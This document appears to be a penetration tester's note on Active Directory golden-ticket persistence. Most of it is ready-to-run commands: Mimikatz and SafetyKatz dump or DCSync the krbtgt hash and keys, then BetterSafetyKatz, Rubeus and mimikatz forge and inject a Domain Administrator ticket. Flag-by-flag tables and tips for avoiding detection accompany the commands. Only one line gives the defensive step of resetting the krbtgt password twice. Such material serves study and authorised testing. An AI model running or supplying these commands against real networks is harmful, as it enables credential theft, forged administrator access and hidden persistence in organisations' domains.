---
tags:
  - persistence
aliases: []
cssclasses:
---
- A golden ticket is signed and encrypted by the hash of the krbtgt account which makes it a valid TGT ticket.
- This deals with abusing TGS-REQ 
- The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.
- As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.

#### Using MimiKatz

```powershell title:"Execute mimikatz on DC as Domain Admin to get krbtgt hash"
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName domain-controller
```

```batch title:"To use DCSync feature for getting AES keys for krbtgt account. Needs a user with replication rights on the domain object or a Domain Admin"
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:domain\krbtgt" "exit"
```

- Using the DCSync option needs no code execution on the target DC.

```batch title:"Create golden ticket on any machine that has network connectivity with DC"
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:domain.name /sid:S-1-XXXXX /aes256:<aes256_key> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

| Arguments            | Description                                                                                                                                            |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| kerberos::golden     | Name of the module                                                                                                                                     |
| /user:Administrator  | Username for which the TGT is generated                                                                                                                |
| /domain:domain.name  | FQDN                                                                                                                                                   |
| /sid:S-1-XXXXX       | SID of the domain                                                                                                                                      |
| /aes256:<aes256_key> | AES256 keys of the krbtgt account. Using AES keys makes the attack more silent                                                                         |
| /id:500 /groups:512  | Optional user RID (default 500) and Group (default 513 512 520 518 519)                                                                                |
| /ptt                 | Injects the ticket in current shell - no need to save the ticket on disk                                                                               |
| /ticket              | Saves the ticket to a file for later use                                                                                                               |
| /startoffset         | Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a large number for future. |
| /endin:600           | Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes                                            |
| /renewmax:10080      | Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 10080                                       |
|                      |                                                                                                                                                        |
#### Using Rubeus

```batch title:"Forge a golden ticket with attributes similar to a normal TGT"
C:\AD\Tools\Rubeus.exe golden /aes256:<aes256_key> /sid:S-1-XXXXX /ldap /user:Administrator /printcmd
```

- Generates the ticket forging command. Note that 3 LDAP queries are sent to the DC to retrieve values:
	- To retrieve flags for user specific in /user
	- To retrieve `/groups`, `/pgid`, `/minpassage` and `/maxpassage`
	- To retrieve `/netbios` of the current domain
- If you have already enumerated the above values, manually specify as many as you can in the forging command, which is a bit more opsec friendly.

```batch title:"Forge the golden ticket"
C:\AD\Tools\Rubeus.exe golden /aes256:<aes256_key> /user:Administrator /id:500 /pgid:513 /domain:domain.name /sid:S-1-XXXXX /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:domain /groups:544,512,520,513 /dc:fqdn /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

| Arguemnt                                  | Description                                                                          |
| ----------------------------------------- | ------------------------------------------------------------------------------------ |
| golden                                    | Name of the module                                                                   |
| /aes256                                   | AES256 keys of the krbtgt account. Using AES keys makes the attack more silent       |
| /user:Administrator                       | Username for which the TGT is generated                                              |
| /id:500                                   | User RID (retrieved from the DC) (Default 500)                                       |
| /pgid:513                                 | Primary Group ID (retrieved from the DC) (Default 513)                               |
| /groups:544,512,520,513                   | Groups the user is a member of (retrieved from the DC) (Default 520,512,513,519,518) |
| /domain:domain.name                       | FQDN of the domain (retrieved from the DC)                                           |
| /sid:S-1-XXXXX                            | SID of the current domain                                                            |
| /pwdlastset:"11/11/2022 6:33:55 AM"       | The PasswordLastSet for the user (retrieved from the DC)                             |
| /minpassage:1                             | "Minimum Password Age" in days (retrieved from the DC)                               |
| /logoncount:2453                          | Logon Count for the user (retrieved from the DC)                                     |
| /netbios:domain                           | NetBIOS name of the domain (retrieved from the DC)                                   |
| /dc:fqdn                                  | FQDN of the DC (retrieved from the DC)                                               |
| /uac:NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD | UserAccountControl Flags (retrieved from the DC)                                     |
| /ptt                                      | Inject in the current process                                                        |
```batch title:"Forge the golden ticket"
mimikatz # kerberos::golden /krbtgt:ntlm_hash /user:Administrator /sid:check_Bloodhound /id:check_Bloodhound /domain:domain.name
```
